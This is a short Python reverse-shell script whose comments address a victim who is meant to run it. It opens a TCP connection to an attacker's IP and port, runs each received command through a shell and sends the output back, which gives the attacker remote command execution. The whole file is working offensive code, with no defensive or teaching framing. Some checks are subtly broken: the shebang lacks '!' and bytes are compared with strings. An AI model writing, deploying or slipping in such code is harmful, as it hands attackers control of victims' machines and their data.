#/usr/bin/env python
### Use python 3
### let victim run this file
import socket, subprocess, attacker_info, os
attacker_ip = attacker_info.attacker_ip      ## attacker's ip
attacker_port = attacker_info.attacker_port  ## attacker's port
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   ## connect to attacker's machine
s.connect((attacker_ip, attacker_port))

while True:
    command = s.recv(1024)        # receive attacker's remote command
    if command == "exit":         # quit shell
        break
    if len(command) > 3 and command[0: 3] == "cd ": # change directory
        os.chdir(command[3:])
        s.send(bytes(" ", "utf8"))
        continue;

    # run command
    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = proc.stdout.read()  + proc.stderr.read()
    if len(output) == 0:
        output = bytes(" ", "utf8")
    s.send(output)

# done
s.close()
